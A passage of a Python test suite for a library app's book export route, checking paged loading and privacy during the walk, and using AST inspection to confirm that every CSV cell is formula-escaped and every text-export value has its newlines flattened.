        once a page passed; with the row, the same plant is caught by name.
        """
        collection = Collection(name=f"{titled} collection")
        db.add(collection)
        db.commit()
        books = [
            Book(
                title=f"{titled} {count - n:02d}",
                author="Ada Example",
                added_by_user_id=owner["user"]["id"],
                collection_id=collection.id,
            )
            for n in range(count)
        ]
        db.add_all(books)
        db.commit()
        db.add_all(
            UserBook(user_id=owner["user"]["id"], book_id=book.id, status=ReadStatus.READ)
            for book in books
        )
        for book in books:
            # Named off the book's own id rather than off `titled`, because
            # both are library wide and unique: a second call with the same
            # prefix would collide on the tag key and on the tag name.
            book.tags.append(
                Tag(
                    key=f"tag-{book.id}",
                    name=f"Shelf tag {book.id}",
                    category=TagCategory.CUSTOM,
                )
            )
            book.classifications.append(
                Classification(scheme=ClassificationScheme.DDC, number=f"{book.id:03d}")
            )
        # Owns nothing, so `users` follows the shelf without a second
        # member's books following with it. See the docstring.
        #
        # Named off this call's own collection row for the reason the tags
        # above are named off the book's id: a username is library wide and
        # unique, so a second call with the same `titled` would collide.
        db.add(User(username=f"onlooker-{collection.id}", password_hash="x"))
        db.commit()

    def titles(self) -> list[str]:
        return [f"Book {n:02d}" for n in range(1, self.BOOKS + 1)]

    @pytest.mark.parametrize("format", list(ExportFormat))
    def test_an_arm_holds_no_more_books_at_once_than_a_page(
        self, client, admin, db, monkeypatch, small_pages, resolved, format
    ):
        """The peak is a page, every book is in the file once, and no channel
        beside the walk was used.

        **Completeness is read off the file rather than off the sum of the
        resolutions.** Summing them couples the walk's correctness to the
        whole request touching no other Book row: a one row probe anywhere in
        the request made the sum say 8 for a shelf of 7 while the walk itself
        was [3, 3, 1] and correct, so the arm went red and named the wrong
        thing. A title's occurrences in the body cannot be confused that way.
        """
        settings_store.set_value(db, SettingKey.LIBRARY_MODE, "true")
        self.a_shelf(db, admin, self.BOOKS)

        res = client.get(
            "/api/books/export", params={"format": format.value}, headers=admin["headers"]
        )

        assert res.status_code == 200
        assert resolved.books, (
            "no resolution was recorded, so this arm watched nothing and "
            "would pass whatever the route did."
        )
        assert max(resolved.books) <= small_pages, (
            f"the {format.value} arm resolved {max(resolved.books)} books at "
            f"once against a page of {small_pages}, so its peak grows with "
            "the shelf."
        )
        assert resolved.queries == [], (
            f"the {format.value} arm took {resolved.queries}, which hands a "
            "query to the caller to run: the rows it resolves are outside "
            "every count here and outside the shelf guard."
        )
        written = {title: res.text.count(title) for title in self.titles()}
        assert written == dict.fromkeys(self.titles(), 1), (
            f"the {format.value} arm wrote {written}. A walk that drops a page "
            "exports a short file and one that repeats a page exports a book "
            "twice, and both answer 200."
        )

    def test_no_arm_loads_more_rows_of_a_paged_entity_at_once_than_a_page(
        self, client, admin, db, small_pages
    ):
        """The ceiling the retired reading records channel held, read off the
        driver instead of off a loader's return type.

        **This is a bound the retirement dropped and this arm puts back.**
        That channel was read as `loaded <= a page` and what replaced it,
        `test_the_rows_behind_an_arm_do_not_grow_with_the_shelf`, reads growth
        between two shelf sizes: a constant load of a set larger than a page
        passes there. Keyed on the mapper, this is the same ceiling over a
        population no return annotation can leave.

        **Over `PAGED` and no further, and each member of it earns the
        ceiling.** An absolute ceiling over every primary load reddens on a
        correct walk, which is why the growth reading beside this is relative.
        `Book` is the page itself and reads **exactly** a page for all three
        formats at either shelf size. `UserBook` is the statuses batch and
        reads exactly a page for the two formats that read one at all, the
        MARCXML arm having no bucket for it, which the liveness filter below
        drops rather than counts. So neither can redden on a correct walk. `Book` sat outside an
        earlier shape of this arm for convenience rather than for that
        reason, and a constant over read of five rows against a page of three
        passed the whole class.

        **Every format at once, so the arm cannot pass vacuously.** The
        MARCXML arm serves the public payload and reads no reading row at
        all, so a parametrised ceiling would pass on it exactly as it would
        pass if the counter had stopped counting. Asking all three together
        lets the arm require that at least one of them loaded something.

        **The liveness check reads the rows, never the key.** A statement
        recorded with a count of zero is present under its entity, so a check
        that the key is there is satisfied by a counter that has stopped
        counting: measured, with every count in the counter forced to zero,
        seven arms across this class and the one in `tests/test_shelf.py`
        reddened and this one did not.
        """
        settings_store.set_value(db, SettingKey.LIBRARY_MODE, "true")
        self.a_shelf(db, admin, self.BOOKS)

        peaks = {
            format: self._exported_rows(client, admin, format) for format in ExportFormat
        }
        for entity in self.PAGED:
            loaded = {
                format.value: peaks[format].get((entity, False)) for format in ExportFormat
            }
            read = {name: rows for name, rows in loaded.items() if rows}
            assert read, (
                f"no arm put a row of {entity.__name__} across the driver: "
                f"{loaded}. Every book in this fixture carries a reading row "
                "and every arm walks a page of Books, so this is the counter "
                "or the route and nothing here can tell which."
            )
            over = {name: rows for name, rows in read.items() if rows > small_pages}
            assert over == {}, (
                f"{over} rows of {entity.__name__} in one statement against a "
                f"page of {small_pages}. A load that is not batched per page "
                "is a second walk of the shelf beside the paged one."
            )

    def _exported_rows(self, client, admin, format) -> dict[tuple[type | None, bool], int]:
        """The largest single load of each `(entity, relationship)` pair one
        export request put across the driver.

        **Not the largest load of each entity.** A page and the collection
        behind it are two loads of two shapes, and the pair is what keeps
        them apart while leaving both inside the comparison below.

        **The request opens its own session, so nothing here can expunge
        inside it.** The arms in `tests/test_shelf.py` expunge between two
        readings because a relationship already in the identity map issues
        no statement; a reading of a whole request cannot, so a second read
        of something the request has already loaded is invisible here. The
        unit is the request and there is nowhere to stand between its
        statements.
        """
        with rows_at_the_engine() as seen:
            res = client.get(
                "/api/books/export", params={"format": format.value}, headers=admin["headers"]
            )
        assert res.status_code == 200
        return peak_rows(seen)

    @pytest.mark.parametrize("format", list(ExportFormat))
    def test_the_rows_behind_an_arm_do_not_grow_with_the_shelf(
        self, client, admin, db, small_pages, format
    ):
        """The fourth reading: what the driver handed over, at two shelf sizes.

        **Relative rather than a row ceiling, and that is the design rather
        than a softening.** Six things this request does legitimately return
        more rows than a page for, and two of them cannot be narrowed away:
        the tag eager load behind a page, and the serialiser re-reading the
        page with a `selectinload` of its own. An absolute ceiling reddens on
        both, and what is left over would still have to admit any constant:
        an auth lookup, a settings read, a reference table. **A constant
        cancels between two shelf sizes and a full pass does not**, so the
        reading is that no load grows.

        **Every load is in the comparison, relationship loads included**, and
        that is the correction to the first shape of this arm. Dropping them
        was an argument about the absolute ceiling above, and it does not
        carry over to a relative reading: a fan out that is constant in the
        shelf cancels, and one that follows the shelf, a collection hoisted
        off the page onto the whole table, is exactly what should redden.

        **Keyed on the `(entity, relationship)` pair the ORM hands over**,
        not on the statement's text. Matching SQL to decide what a statement
        is about is the shape this repository has been wrong about every time
        it has tried it.

        **What this accepts, stated rather than discovered later.** A
        constant over read, an arm that always pulls five hundred rows
        whatever the shelf holds, passes: two sizes cannot see a curve
        either, so sub linear growth passes as well. The absolute half is the
        Books channel above, which bounds what a member hands back at a page.

        **What it refuses that somebody may want.** A loading option that
        joins a collection rather than selecting it separately multiplies the
        rows of the primary load by the fan out, which stays constant in the
        shelf and passes here, but `Loading` adding one would be measured by
        `tests/test_shelf.py::TestAPageIsWholeHoweverTheLoadingJoins` instead.
        A legitimate statement that grows with the shelf inside one export
        request is refused outright, and the export has none.
        """
        settings_store.set_value(db, SettingKey.LIBRARY_MODE, "true")
        self.a_shelf(db, admin, self.BOOKS)
        small = self._exported_rows(client, admin, format)

        self.a_shelf(db, admin, self.BOOKS, titled="Extra")
        grown = self._exported_rows(client, admin, format)

        counted = {_named(key): rows for key, rows in small.items()}
        assert small.get((Book, False)), (
            f"no primary load of Book carried a row, only {counted}. An empty "
            "reading, one that missed the page, and a counter recording every "
            "statement with a count of zero all leave this arm passing "
            "whatever the route did. The last of the three is why this reads "
            "the rows rather than asking whether the key is present: a "
            "statement of zero rows satisfies the key."
        )
        grew = {
            _named(key): (small.get(key, 0), rows)
            for key, rows in grown.items()
            if rows > small.get(key, 0)
        }
        assert grew == {}, (
            f"the {format.value} arm grew with the shelf: {grew}, as "
            f"(rows at {self.BOOKS} books, rows at {self.BOOKS * 2}). A load "
            "whose size follows the shelf is a full pass however the page "
            f"boundary at {small_pages} looks from Python."
        )

    @pytest.mark.parametrize("format", list(ExportFormat))
    def test_an_arm_hands_the_transport_a_walk_that_has_not_run(
        self, client, admin, db, monkeypatch, small_pages, format
    ):
        """The half the row counting misses, which is what is handed over.

        Two readings, because neither alone is enough, and both were measured
        against a mutant the other passes. A generator that accumulates every
        page and yields once is `GEN_CREATED` when it is handed over, so the
        state alone forgives it. A route that joins the pages into a string
        fails the state and passes the piece count, because iterating a `str`
        yields one piece per character.

        The state is read at the moment the response is built rather than
        afterwards: by the end of the request every generator is closed and
        says nothing about when it ran.

        **What the piece count refuses, deliberately**: an arm that coalesces
        pages up to a byte bound and flushes, which is an ordinary way to stop
        a streamed response emitting tiny chunks and which holds one page plus
        the buffer. This is a narrowing to one piece a page, not a measurement
        of memory, and no assertion can be both at this fixture's size: the
        whole seven book body is 434 characters, so a flush at 8 KiB and an
        accumulation of everything are byte for byte the same file. Growing
        the fixture to separate them is refused; a bound that only holds at a
        size no test uses is not a bound this class can keep.

        For MARCXML this is **strictly weaker** than
        `tests/routers/test_imports_marc.py::TestTheExportIsPagedRatherThanWhole::test_the_response_is_handed_a_walk_that_has_not_run`,
        which reads the state of the walk itself rather than of the body over
        it; this arm's worth is that it covers the other two formats at all.
        """
        settings_store.set_value(db, SettingKey.LIBRARY_MODE, "true")
        self.a_shelf(db, admin, self.BOOKS)
        states: list[str | None] = []
        pieces: list[int] = []

        def recording(content, *args, **kwargs):
            # `None` is what a list or a string reports, which is the shape an
            # arm that built the file first would hand over.
            states.append(
                inspect.getgeneratorstate(content) if inspect.isgenerator(content) else None
            )

            def counted():
                for piece in content:
                    pieces.append(len(piece))
                    yield piece

            return StreamingResponse(counted(), *args, **kwargs)

        # By name: it is a module level name in that module rather than part
        # of its declared surface, which mypy refuses to reach through.
        monkeypatch.setattr("routers.books.StreamingResponse", recording)

        res = client.get(
            "/api/books/export", params={"format": format.value}, headers=admin["headers"]
        )

        assert res.status_code == 200
        assert states == [inspect.GEN_CREATED], (
            f"the {format.value} arm handed the transport {states}, so the "
            "whole file existed before the response did."
        )
        pages = -(-self.BOOKS // small_pages)
        assert len(pieces) >= pages, (
            f"the {format.value} arm sent the body in {len(pieces)} pieces "
            f"over {pages} pages, so it accumulated before it yielded."
        )

    def test_a_book_made_private_ahead_of_the_walk_is_in_no_page(
        self, admin, member, db, small_pages
    ):
        """Every page is a fresh query, so the privacy rule is re-applied.

        **This is the only arm in the tree that watches visibility change
        under a walk.** Every other one here walks a shelf with nothing hidden
        from it, so it cannot tell a walk of the shelf from a walk of the
        table, and the paging arms next door count rows rather than read them.

        **What it does not catch, measured rather than assumed**: hoisting
        `Shelf.seen_by` above the loop and reusing the object. `visible_to`
        rides in the query's SQL, so the hoisted object re-executes the same
        statement per page, and that mutation survived every arm in this file,
        twice, on two seats' harnesses. What it does catch is the shape the
        docstring it guards contrasts with, a shelf resolved once and sliced,
        which reddens this arm and the three book counting arms together.

        The shelf is owned by another member, so `visible_to` is what keeps
        the flipped book out rather than ownership.

        **The flip goes through a second session, and that is not tidiness.**
        Mutating through the session doing the walking cannot tell a fresh
        query from the identity map handing back the object it already holds.
        A concurrent request is a second session in production as well.
        """
        self.a_shelf(db, member, self.BOOKS)

        pages = books_router._export_pages(db, admin["user"]["id"], Loading.EXPORTED)
        first = next(pages)
        other = SessionLocal()
        try:
            ahead = (
                other.query(Book).filter(Book.id > first[-1].id).order_by(Book.id).first()
            )
            # The position is asserted rather than assumed: a fixture that
            # drifted so the flip landed behind the cursor would leave an arm
            # that passes because the book was already written.
            assert ahead is not None
            assert ahead.id > first[-1].id
            hidden = ahead.id
            ahead.is_private = True
            other.commit()
        finally:
            other.close()

        written = [book.id for book in first]
        written += [book.id for page in pages for book in page]

        assert hidden not in written, (
            "a book made private ahead of the cursor was still exported, so "
            "the shelf was resolved once rather than once a page."
        )
        assert len(written) == self.BOOKS - 1

    def test_the_route_serves_exactly_the_formats_this_class_drives(self):
        """The parametrisation reads `ExportFormat`, and this is what says the
        route is bound by the same enum.

        Asserting the members by name instead would refuse a format somebody
        legitimately adds, which is the arm going red for the one change it
        should welcome.
        """
        assert typing.get_type_hints(books_router.export_books)["format"] is ExportFormat

    def test_the_books_channel_tells_a_whole_shelf_from_a_page(
        self, admin, db, small_pages, resolved
    ):
        """The diagonal: the shape this class exists to catch, driven past the
        same recorder.

        Without it, a recorder that observed nothing would report an empty
        list for every arm and forgive every one of them. The arms above
        already refuse an empty list; this says the non empty one means what
        it claims.
        """
        self.a_shelf(db, admin, self.BOOKS)

        Shelf.seen_by(db, admin["user"]["id"]).all(load=Loading.EXPORTED)

        assert resolved.books == [self.BOOKS]
        assert max(resolved.books) > small_pages

    def test_the_recorder_sees_the_query_door(self, admin, db, resolved):
        """The query door channel's diagonal, and it needs its own.

        It was added because a mutant walked past the row counting: a full
        pass through `Shelf.select` beside an intact walk. An arm asserting
        the channel is empty is worth nothing until something has been seen
        to fill it.

        **This is the channel the driver cannot take over.** A query handed
        to the caller has resolved nothing, so there are no rows to count
        until somebody runs it, which may be after the response or never.
        """
        self.a_shelf(db, admin, self.BOOKS)

        Shelf.seen_by(db, admin["user"]["id"]).select(Book).all()

        assert resolved.queries == ["select"]

    def test_the_row_counter_tells_a_whole_shelf_from_a_page(self, admin, db, small_pages):
        """The fourth reading's diagonal: the two shapes, past the same counter.

        The arm reads growth between two shelf sizes, so the diagonal has to
        show both halves of that: a paged walk whose largest load is a page
        at either size, and the shape the class exists to catch, whose
        largest load is the shelf and doubles when the shelf does.
        """
        viewer = admin["user"]["id"]
        self.a_shelf(db, admin, self.BOOKS)

        with rows_at_the_engine() as seen:
            list(books_router._export_pages(db, viewer, Loading.EXPORTED))
        paged = peak_rows(seen)[Book, False]
        with rows_at_the_engine() as seen:
            Shelf.seen_by(db, viewer).all(load=Loading.EXPORTED)
        whole = peak_rows(seen)[Book, False]

        self.a_shelf(db, admin, self.BOOKS, titled="Extra")
        with rows_at_the_engine() as seen:
            list(books_router._export_pages(db, viewer, Loading.EXPORTED))
        paged_again = peak_rows(seen)[Book, False]
        with rows_at_the_engine() as seen:
            Shelf.seen_by(db, viewer).all(load=Loading.EXPORTED)
        whole_again = peak_rows(seen)[Book, False]

        assert paged == paged_again == small_pages
        assert (whole, whole_again) == (self.BOOKS, self.BOOKS * 2)

    def test_the_row_counter_sees_a_reading_load_hoisted_off_the_page(
        self, admin, db, small_pages
    ):
        """What the retired reading records channel watched, read off the driver.

        **Stronger in population and weaker in bound, and the two directions
        moved at once.** Keyed on the mapper this sees every `UserBook` load
        whatever the loader hands back, where the retired matcher keyed on
        `Records` by identity and its own docstring stated the blind spot: a
        loader returning a plain list of rows was neither watched nor
        refused. The mapper is a property of the execution and no return
        annotation changes it.

        **The bound the retirement dropped is restored beside this rather
        than carried as residue.** That channel was read as an absolute
        ceiling of a page, and this reading is growth between two shelf
        sizes, so a constant load larger than a page would pass here.
        `test_no_arm_loads_more_rows_of_a_paged_entity_at_once_than_a_page`
        is the ceiling, and it is the arm to look at before calling this one
        a replacement.

        **This is the counter's diagonal and not that ceiling's**, which the
        class docstring used to say it was. It drives `Reading` directly and
        never the route, so a statuses batch hoisted **inside** the route
        leaves it green while the ceiling reddens. What it establishes is
        that a `UserBook` load reaches the counter at all.
        """
        viewer = admin["user"]["id"]
        self.a_shelf(db, admin, self.BOOKS)

        with rows_at_the_engine() as seen:
            Reading.by(db, viewer).everything()
        hoisted = peak_rows(seen)[UserBook, False]

        page = [book.id for book in next(books_router._export_pages(db, viewer, Loading.EXPORTED))]
        with rows_at_the_engine() as seen:
            Reading.by(db, viewer).of(page)
        batched = peak_rows(seen)[UserBook, False]

        assert hoisted == self.BOOKS > small_pages
        assert batched == small_pages

    def test_the_derivation_refuses_a_door_it_cannot_watch(self):
        """The refusal is the half a green run never exercises.

        **Driven against the door matcher, which is the one caller that still
        refuses.** `select` is named because it is the door that exists. The
        refusal is driven against a class built for it rather than against
        `Shelf`, because a rule asserted only where it is satisfied is a rule
        nobody has watched fail.

        **The second half is the retirement, asserted rather than described.**
        The same shape is now let through the resolver derivation, silently,
        and what covers it instead is the row counter: its rows cross the
        driver whatever descriptor the member is wrapped in.
        """
        assert "select" in _shelf_query_doors()

        class Opening:
            @property
            def door(self) -> Query[Book]:
                raise NotImplementedError

        with pytest.raises(AssertionError, match="door"):
            _watched_members(
                Opening, _is_a_query, "an unresolved query", refuse_descriptors=True
            )

        assert "all" in _shelf_resolvers()

        class Resolving:
            @property
            def rows(self) -> list[Book]:
                raise NotImplementedError

        with pytest.raises(AssertionError, match="matched nothing"):
            _watched_members(Resolving, _holds_book_rows, "Book rows", refuse_descriptors=False)

    def test_the_derivation_permits_a_door_handed_the_query_it_narrows(self):
        """The permitted branch, which is the half that had no arm at all.

        A descriptor the recorder cannot wrap is refused **unless its
        parameters carry the subject**: rows that arrive from the caller were
        resolved by something already watched, so refusing one would be an arm
        going red for a change that cannot blind anything. That paragraph sat
        above the branch with nothing driving it, which is an unenforced rule
        inside the one file whose subject is unenforced rules.

        The class carries a plain door as well, because the derivation refuses
        a class that watches nothing and a permitted member is not a watched
        one.
        """

        class Helping:
            def door(self) -> Query[Book]:
                raise NotImplementedError

            @staticmethod
            def narrowed(query: Query[Book]) -> Query[Book]:
                raise NotImplementedError

        watched = _watched_members(
            Helping, _is_a_query, "an unresolved query", refuse_descriptors=True
        )

        assert watched == ["door"], (
            f"{watched}. A staticmethod handed the query it narrows is "
            "permitted rather than refused, and it is not watched either: "
            "whatever resolved those rows is watched at its own site."
        )

    def test_every_watched_resolver_hands_back_a_container_this_channel_opens(self):
        """The Books channel reads what it can open, and this is what says it
        can open everything a resolver declares.

        **The reach of that channel is bounded by the containers its walk
        knows, and from inside the channel the bound is invisible**: an
        unopened container reads as zero books, which is the same number an
        unwatched member reads as, so every arm over the channel stays green.
        Measured: a resolver handing back `dict[int, Book]` over the whole
        table was counted as three resolutions of zero, and only the row
        counter fired.

        **The row counter does not cover it**, which is why this is worth an
        arm rather than a note. The channel is kept for exactly what the
        counter cannot see, a page that comes back short, and a short page
        handed back in a container the walk skips is invisible to both.

        **Derived from each resolver's declared return type and probed
        against the walk itself.** Neither half is a list of container names:
        the annotation says what arrives and `_opens` asks the walk what it
        does with one, so the next container type to appear on `Shelf` fails
        here by name instead of landing as a silent zero.

        **The opener reads the walked set rather than building a container
        and asking the walk**, for the reason `_opens` carries, so nothing in
        it exercises the walk. The walk is therefore driven here, on a list
        and on a mapping, because an opener that answers yes over a walk that
        counts nothing is the same silent zero one turn earlier.

        **An abstract container is refused on its own ground**, with its own
        message, rather than falling out of the probe below answering no to
        anything it cannot instantiate. The families are not admitted: a
        `deque` is a `Sequence`, so letting the abstract spellings through
        would readmit the one container this arm's diagonal is built on. What
        an abstract annotation costs is that it does not say what arrives, and
        the walk's answer depends on what does.

        **Its own diagonal is driven here rather than planted**, because
        `Shelf` declares nothing the walk cannot open today and an arm
        asserting an empty set over an empty population is an arm nobody has
        watched fail.
        """
        assert _containers_holding_book_rows(deque[Book]) == {deque}
        assert not _opens(deque)
        assert _containers_holding_book_rows(tuple[list[Book], int]) == {tuple, list}
        # A union is reached through nothing, so it contributes no container.
        assert _containers_holding_book_rows(Book | None) == set()
        # Neither spelling carries arguments of its own, and they carry
        # their target on different attributes, so each is driven.
        assert _containers_holding_book_rows(_RowsBehindAnAlias) == {list}
        assert _containers_holding_book_rows(_RowsBehindANewType) == {list}
        # The abstract branch, and the reason it is a branch: a deque is a
        # Sequence, so admitting the family readmits the diagonal above.
        assert _containers_holding_book_rows(Sequence[Book]) == {Sequence}
        assert inspect.isabstract(Sequence)
        assert issubclass(deque, Sequence)
        assert not inspect.isabstract(deque)
        # The walk opens a mapping through a branch of its own and the
        # opener reads the tuple, so the mapping type has to be in that
        # tuple for the two to agree: dropping it leaves the walk still
        # opening one and this answering no, which is what this line holds.
        assert _opens(dict)
        # A subclass the walk opens and no constructor convention reaches:
        # `defaultdict` takes its factory as the first positional argument.
        assert _opens(defaultdict)
        # The opener no longer touches the walk, so the walk is driven here:
        # a container answering yes over a walk that counts nothing is the
        # silent zero this arm exists to stop, one turn earlier. The mapping
        # line holds the flatten branch as well as the count, measured:
        # deleting that branch leaves the list line green at two and takes
        # this one to zero, where stopping the walk at the row branch takes
        # both to zero.
        first, second = Book(title="a probe"), Book(title="another probe")
        assert _books_in([first, second]) == 2
        assert _books_in({1: first, 2: second}) == 2

        abstract: dict[str, list[str]] = {}
        shut: dict[str, list[str]] = {}
        for name in _shelf_resolvers():
            hint = typing.get_type_hints(getattr(Shelf, name))["return"]
            for container in sorted(
                _containers_holding_book_rows(hint), key=lambda kind: kind.__name__
            ):
                if inspect.isabstract(container):
                    abstract.setdefault(name, []).append(container.__name__)
                elif not _opens(container):
                    shut.setdefault(name, []).append(container.__name__)

        assert abstract == {}, (
            f"{abstract} hand back an abstract container. A resolver names a "
            "concrete one here, because an abstract annotation does not say "
            "what arrives, and admitting the sequence and collection families "
            "would readmit a `deque`, which is the container this arm's own "
            "diagonal is built on. This is the rule rather than a consequence "
            "of what can be instantiated: name the container the member "
            "returns."
        )
        assert shut == {}, (
            f"{shut} hand back a container the Books channel does not open, so "
            "every Book inside one is counted as zero and every arm reading "
            "the channel passes on it. Teach `_books_in` the container, or "
            "that reading is the row counter's alone and a short page behind "
            "it is seen by nothing."
        )


def _export_columns() -> list[tuple[str, bool]]:
    """Each CSV export column, paired with whether its cell goes through `_csv_safe`.

    Read off the writer's own two argument lists rather than off a copy of the
    header, so a column added to one list and not the other fails here instead
    of silently shifting every cell after it by one.
    """
    source = Path(inspect.getsourcefile(books_router) or "").read_text()

    written: list[tuple[int, list[ast.expr]]] = []
    for node in ast.walk(ast.parse(source)):
        if not isinstance(node, ast.Call):
            continue
        if not (isinstance(node.func, ast.Attribute) and node.func.attr == "writerow"):
            continue
        if not node.args or not isinstance(node.args[0], ast.List):
            continue
        written.append((node.lineno, node.args[0].elts))
    written.sort(key=lambda pair: pair[0])

    assert len(written) == 2, (
        "The CSV export writes one header row and one row per book. Found "
        f"{len(written)} `writerow` calls taking a list literal, so this guard "
        "is reading something other than the export it was written for."
    )
    header_elements, row_elements = (elements for _, elements in written)

    names = [
        element.value
        for element in header_elements
        if isinstance(element, ast.Constant) and isinstance(element.value, str)
    ]
    assert len(names) == len(header_elements), (
        "Every header cell is a string literal. One that is computed cannot be "
        "paired with the cell below it, and this guard would skip it."
    )
    escaped = [
        isinstance(cell, ast.Call)
        and isinstance(cell.func, ast.Name)
        and cell.func.id == "_csv_safe"
        for cell in row_elements
    ]
    assert len(names) == len(escaped), (
        f"{len(names)} headers against {len(escaped)} cells. The export writes "
        "them as two literal lists, so they are only in step by hand."
    )
    return list(zip(names, escaped, strict=True))


class TestNoCellOfTheCsvExportSkipsTheEscape:
    """Escaping every cell is cheaper to guard than knowing which may skip it.

    Eight of eighteen used to be exempt, on the argument that the column's own
    type or validator makes a formula impossible. Two things were wrong with
    that. `purchase_currency` was not one of those columns, and the comment
    above the block said four where there were eight, so nothing counted. And
    the argument names the validator at the API, while `backup._parse_row`
    inserts a restored archive through Core: it coerces the temporal columns
    and nothing else, and SQLite is dynamically typed, so `books.year` will
    hold a formula and read it back as one.

    So there is no exempt set to keep in step with the writer, and no argument
    about which write paths exist. A cell that is not a `_csv_safe` call is a
    failure, and that is the whole rule.

    **It reads the spelling of each cell, not what the cell does.** A rewrite
    that escaped a tag name inside the join rather than the joined string is
    safe and goes red here, and one that weakened `_csv_safe` itself is unsafe
    and does not. `TestExport` carries the second half, driven off
    `_FORMULA_LEAD`.
    """

    def test_the_guard_can_tell_an_escaped_cell_from_a_bare_one(self):
        """A pass that recognised nothing would report every cell escaped and
        forgive everything, which is the failure mode of asserting an empty
        list. `_csv_safe` renamed is what makes the matcher blind."""
        assert hasattr(books_router, "_csv_safe")
        columns = _export_columns()
        assert [name for name, escaped in columns if escaped]
        assert len({name for name, _ in columns}) == len(columns), (
            "Two export columns share a header name, so the file cannot be "
            "read back by header and this guard cannot name what it found."
        )

    def test_every_cell_is_escaped(self):
        bare = [name for name, escaped in _export_columns() if not escaped]
        assert bare == [], (
            f"{bare} reach the file without `_csv_safe`. There is no exemption "
            "to add them to: a column whose value cannot begin with a formula "
            "lead loses nothing by being escaped, and the argument that it "
            "cannot is the one a restored archive defeats."
        )


def _export_text_lines() -> list[tuple[str, bool]]:
    """Each line of the `txt` export record, paired with whether its value goes
    through `_one_line`.

    Read off the writer's own list literal, the same way `_export_columns`
    reads the CSV arm's two: a line added without the flattening fails here
    rather than shipping a value that can open a line of its own.

    It finds that list by shape rather than by name: the one `"\n".join([...])`
    in the module. The two other f-strings in the same handler build a filename
    and a Content-Disposition header, and neither is joined with a newline.
    """
    source = Path(inspect.getsourcefile(books_router) or "").read_text()

    joined = [
        node.args[0]
        for node in ast.walk(ast.parse(source))
        if isinstance(node, ast.Call)
        and isinstance(node.func, ast.Attribute)
        and node.func.attr == "join"
        and isinstance(node.func.value, ast.Constant)
        and node.func.value.value == "\n"
        and node.args
        and isinstance(node.args[0], ast.List)
    ]
    assert len(joined) == 1, (
        "The txt export writes one record per book as a list of lines joined "
        f"with a newline. Found {len(joined)} such joins, so this guard is "
        "reading something other than the export it was written for."
    )

    lines: list[tuple[str, bool]] = []
    for element in joined[0].elts:
        assert isinstance(element, ast.JoinedStr), ast.unparse(element)
        label, *rest = element.values
        assert isinstance(label, ast.Constant), ast.unparse(element)
        assert len(rest) == 1, (
            f"{ast.unparse(element)} carries {len(rest)} parts after its label, so "
            "this guard cannot say which value is flattened."
        )
        assert isinstance(rest[0], ast.FormattedValue), (
            f"{ast.unparse(element)} follows its label with text rather than an "
            "interpolation, so there is no value for this guard to check."
        )
        value = rest[0].value
        lines.append(
            (
                str(label.value),
                isinstance(value, ast.Call)
                and isinstance(value.func, ast.Name)
                and value.func.id == "_one_line",
            )
        )
    return lines


class TestNoLineOfTheTextExportSkipsTheFlattening:
    """Flattening every value is cheaper to guard than knowing which may skip it.

    The CSV arm reached the same place by a longer road: eight of its cells were
    exempt on the argument that the column's own type or validator makes the
    dangerous character impossible, and that argument was wrong twice over. It
    now has no exempt set at all, and this arm starts with none.

    **It reads the spelling of each value, not what the value does.** A rewrite
    that flattened a tag name inside the join rather than the joined string is
    safe and goes red here, and one that weakened `_one_line` itself is unsafe
    and does not. `TestTheTextExportCannotBeMadeToForgeALine` carries the
    second half.
    """

    def test_the_guard_can_tell_a_flattened_value_from_a_bare_one(self):
        """A pass that recognised nothing would report every value flattened
        and forgive everything, which is the failure mode of asserting an empty
        list. `_one_line` renamed is what makes the matcher blind."""
        assert hasattr(books_router, "_one_line")
        lines = _export_text_lines()
        assert [label for label, flattened in lines if flattened]
        assert len({label for label, _ in lines}) == len(lines), (
            "Two lines of the txt record share a label, so a reader cannot tell "
            "which field they are looking at and this guard cannot name what "
            "it found."
        )

    def test_every_value_is_flattened(self):
        bare = [label for label, flattened in _export_text_lines() if not flattened]
        assert bare == [], (
            f"{bare} reach the file without `_one_line`. There is no exemption "
            "to add them to: a value that cannot contain a newline loses "
            "nothing by being flattened, and the argument that it cannot is "
            "the one a restored archive defeats."
        )


def _every_line_break_in_unicode() -> tuple[str, ...]:
    """Every code point a reader of this file treats as the end of a line.

    **Swept rather than listed**, and the ceiling is `sys.maxunicode` rather
    than a literal, because both halves of that have already been paid for
    elsewhere in this tree: a guard that enumerates the spellings somebody
    thought of fails the round after, and a sweep written `range(0x11000)`
    covers a sixteenth of Unicode and looks identical to one that does not.

    It had been paid here too. The arms below named five characters and
    `_one_line`'s docstring named the same five, so the one rewrite anybody
    would actually make, flattening the breaks it can name instead of the
    whitespace it cannot, satisfied the docstring and passed every arm while
    letting the other five through.

    `str.splitlines()` is the instrument because it is what reads the export
    back: `_lines_opening` parses the file with it, and so does any reader
    written in Python. It is deliberately **narrower** than the whitespace
    `_one_line` removes, so every arm driven off it is an arm about a forged
    line rather than about a collapsed space.

    **Unicode's own answer is a different one, and the difference is not what
    decides it.** Asking `unicodedata` for bidi class `B` plus categories `Zl`
    and `Zp` returns eight, dropping U+000B and U+000C. Only one of those two is
    among the five that a narrowed `_one_line` leaks, so arms derived that way
    would have caught the same rewrite by four rather than five and the choice
    of instrument cannot be argued from leak coverage. It rests on the sentence
    above instead: the question is what the reader of the export breaks a line
    on, not what Unicode calls a separator. Both sets sit inside the whitespace
    `_one_line` removes, so the choice decides what the arms cover and not
    whether the export is safe.

    Surrogates are skipped: they are not characters, and no payload carries one.
    """
    return tuple(
        chr(cp)
        for cp in range(sys.maxunicode + 1)
        if not 0xD800 <= cp < 0xE000 and len(f"a{chr(cp)}b".splitlines()) > 1
    )


#: Derived once per run, and every arm below that needs a line break takes it
#: from here. A code point Python starts breaking on grows an arm by itself.
_LINE_BREAKS = _every_line_break_in_unicode()

#: The floor under that sweep, and the reason it is a floor rather than a count.
#:
#: `docs/decisions.md` records the arms over `_FORMULA_LEAD` needing an equality
#: assertion beside them because they were parametrised off the very tuple they
#: guarded: reducing that tuple reduced the test to one arm and was measured to
#: be caught by nothing. Every arm in the class below is parametrised off
#: `_LINE_BREAKS` the same way, so a predicate that narrowed the sweep would
#: narrow the arms with it and stay green.
#:
#: A **floor** and not an equality, which is where this differs from
#: `_FORMULA_LEAD`: that tuple is a decision somebody made, and this one is a
#: fact about the interpreter. A Python that starts breaking on an eleventh code
#: point should grow an arm, not go red. Measured on two CPython 3.14 builds,
#: 3.14.0 and 3.14.7: these ten and no others.
_BREAKS_AS_MEASURED = (
    "\n",
    "\x0b",
    "\x0c",
    "\r",
    "\x1c",
    "\x1d",
    "\x1e",
    "\x85",
    "\u2028",
    "\u2029",
)


def _plant_through_book_create(field: str):
